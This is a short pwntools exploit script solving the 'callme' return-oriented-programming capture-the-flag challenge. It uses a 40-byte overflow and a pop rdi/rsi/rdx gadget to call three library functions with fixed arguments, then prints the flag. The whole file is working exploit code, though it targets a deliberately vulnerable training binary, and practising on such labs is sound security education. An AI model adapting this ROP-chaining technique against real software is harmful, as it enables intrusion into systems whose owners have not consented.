#!/usr/bin/env python3

###
## authored by brvsh
## https://brv.sh/
###

from pwn import *

elf = context.binary = ELF("./callme", checksec=False)
proc = process()

payload = flat([
    b"A" * 40,                      # padding

    p64(0x40093c),              	# stage 1 - pop rdi ; pop rsi ; pop rdx ; ret
    p64(0xdeadbeefdeadbeef),    	# stage 1 - rdi
    p64(0xcafebabecafebabe),    	# stage 1 - rsi
    p64(0xd00df00dd00df00d),    	# stage 1 - rdx
    p64(elf.sym["callme_one"]), 	# stage 1 - ret2callme_one

    p64(0x40093c),              	# stage 2 - pop rdi ; pop rsi ; pop rdx ; ret
    p64(0xdeadbeefdeadbeef),    	# stage 2 - rdi
    p64(0xcafebabecafebabe),    	# stage 2 - rsi
    p64(0xd00df00dd00df00d),    	# stage 2 - rdx
    p64(elf.sym["callme_two"]), 	# stage 2 - ret2callme_two

    p64(0x40093c),                  # stage 3 - pop rdi ; pop rsi ; pop rdx ; ret
    p64(0xdeadbeefdeadbeef),        # stage 3 - rdi
    p64(0xcafebabecafebabe),        # stage 3 - rsi
    p64(0xd00df00dd00df00d),        # stage 3 rdx
    p64(elf.sym["callme_three"]),   # stage 3 - ret2callme_three
])

proc.sendlineafter(b"\n> ", payload)
info("brvsh> payload sent!")
proc.recvuntil(b"two() called correctly\n")
info(f"brvsh> FLAG! {proc.recvline().decode()}")
proc.close()
